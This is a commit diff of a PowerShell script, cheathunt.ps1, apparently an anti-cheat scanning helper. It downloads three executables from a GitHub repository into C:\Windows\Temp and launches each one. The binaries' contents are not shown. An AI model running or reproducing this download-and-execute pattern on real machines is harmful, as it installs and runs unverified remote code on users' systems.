a49a8fa7b8e08155a8380a93380abc5fb177ca6a
fosslas <dimovanka5@gmail.com>
2026-05-28 19:24:43 +0200

    Update cheathunt.ps1

--- files/cheathunt.ps1
+++ files/cheathunt.ps1
@@ -1,26 +1,23 @@
-$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe','C:\Windows\Temp\Timeless.exe')
-Start-Process 'C:\Windows\Temp\Timeless.exe'"
-$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe','C:\Windows\Temp\timeless_scanner.exe')
-Start-Process 'C:\Windows\Temp\timeless_scanner.exe'"
-$URL = "(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe','C:\Windows\Temp\block_majestic.exe')
-Start-Process 'C:\Windows\Temp\block_majestic.exe'"
-$Output = "$env:TEMP\downloaded_file.tmp"
+$downloads = @(
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe'  },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
+    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
+)
 
-$webClient = New-Object System.Net.WebClient
+foreach ($item in $downloads) {
+    $webClient = New-Object System.Net.WebClient
 
-# Прогресс во время загрузки
-$webClient.add_DownloadProgressChanged({
-    Write-Progress -Activity "Загрузка..." `
-                   -Status "$($_.ProgressPercentage)% завершено" `
-                   -PercentComplete $_.ProgressPercentage
-})
+    $webClient.add_DownloadProgressChanged({
+        Write-Progress -Activity "Загрузка: $($item.Path)" `
+                       -Status "$($_.ProgressPercentage)%" `
+                       -PercentComplete $_.ProgressPercentage
+    })
 
-# Когда загрузка завершена
-$webClient.add_DownloadFileCompleted({
-    Write-Progress -Activity "Загрузка..." -Status "Готово" -Completed
-    Write-Host "Файл загружен!" -ForegroundColor Green
-})
+    $task = $webClient.DownloadFileTaskAsync($item.URL, $item.Path)
+    $task.Wait()
 
-# Асинхронная загрузка (нужна для работы событий)
-$task = $webClient.DownloadFileTaskAsync($URL, $Output)
-$task.Wait()
+    Write-Progress -Activity "Загрузка: $($item.Path)" -Status "Готово" -Completed
+    Write-Host "Скачано: $($item.Path)" -ForegroundColor Green
+
+    Start-Process $item.Path
+}
